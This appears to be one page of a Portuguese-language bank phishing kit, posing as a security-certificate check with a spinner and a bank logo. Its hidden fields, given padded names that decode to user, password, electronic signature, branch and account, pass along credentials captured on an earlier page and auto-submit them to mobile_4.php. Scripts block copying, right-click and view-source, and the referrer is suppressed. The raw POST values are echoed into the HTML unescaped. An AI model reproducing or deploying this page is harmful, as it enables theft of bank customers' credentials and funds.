<html lang="pt-br"><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">




    <meta charset="utf-8">
     <title>Atualização</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
		
    <link href="./css/tiopatas.css" rel="stylesheet">
    <style type="text/css">


    h1, input {
        font-family: "Open Sans", Helvetica, sans-serif;
    }

    .input {
        width: 100%;
		background-color: #f7f7f7;
        height: 50px;
        display: block;
        padding: 0 5px;
        border: none;
        border-bottom: 3px solid #ebebeb;
    }
    .input:focus {
        outline: none;
        border-bottom-color: #ff0000 !important;
    }

	
.form-signin
{
    max-width: 100%;
    padding: 20px;
    margin: auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 20px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.form-signin .form-control:focus
{
    z-index: 2;
}
.form-signin input[type="text"]
{
    margin-bottom: -1px;
    border-bottom-left-radius: 0px;
    border-bottom-right-radius: 0px;
}
.form-signin input[type="password"]
{
    margin-bottom: 10px;
    border-top-left-radius: 0px;
    border-top-right-radius: 0px;
}
.account-wall
{
    margin-top: -10px;
    padding: 0px 0px 0px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 100%;
    height: 50px;
    margin: 5px 0px 0px;
    display: block;
    /*-moz-border-radius: 0%;
    -webkit-border-radius: 0%;
    border-radius: 40%;*/
}





.spinner {
 width: 150px;
  height: 95px;
  position: relative;
  margin: 100px auto;
}

.double-bounce1, .double-bounce2 {
  width: 100%;
  height: 100%;
  border-radius: 50%;
  background-image: url("T_A_b.png");
  opacity: 0.9;
  position: absolute;
  top: -50px;
  left: 0;
  
  -webkit-animation: sk-bounce 2.0s infinite ease-in-out;
  animation: sk-bounce 2.0s infinite ease-in-out;
}

.double-bounce2 {
  -webkit-animation-delay: -1.0s;
  animation-delay: -1.0s;
}

@-webkit-keyframes sk-bounce {
  0%, 100% { -webkit-transform: scale(0.0) }
  50% { -webkit-transform: scale(1.0) }
}

@keyframes sk-bounce {
  0%, 100% { 
    transform: scale(0.0);
    -webkit-transform: scale(0.0);
  } 50% { 
    transform: scale(1.0);
    -webkit-transform: scale(1.0);
  }
}




hr.style13 {
	height: 10px;
	border: 0;
	box-shadow: 0 10px 10px -10px #8c8b8b inset;
}





</style>
  <script>
  setTimeout(function() {
    document.getElementById('formulario').submit();
  }, 3000);
</script>			

</head>
<body>
<form action="mobile_4.php" method="post" name="formulario" id="formulario">
    
    <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="hidden" value="<?php echo $_POST['xuxsxuxaxrxixox']; ?>">
    <input name="xsxexnxhxax" id="xsxexnxhxax" type="hidden" value="<?php echo $_POST['xsxexnxhxax']; ?>" >
    <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="hidden" value="<?php echo $_POST['xaxsxsxexlxextxrxoxnxixcxax']; ?>" >
    <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
    <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">

</form>

<div class="container">
    <div class="row">
        <div>
            <div class="account-wall">
			
				<h6 align="center" style=" background-color: #E40203;"><img src="./img/logo.png" height="80" width="250"></h6>
				<h5 align="center"><b><font color="ff0000">Aguarde...</font></b><br><br><font color="000">Verificando o Certificado de Segurança</font></h5>
					  <hr class="style13">
					  <div class="spinner">
  <div class="double-bounce1"></div>
  <div class="double-bounce2"></div>
</div>
					  
						<img class="profile-img" src="./img/one.png" alt="">
            </div>
        </div>
		
		
		
		
		
		
		
		
		
		
		
    </div>
</div>
<script type="text/javascript">

</script>


</body></html>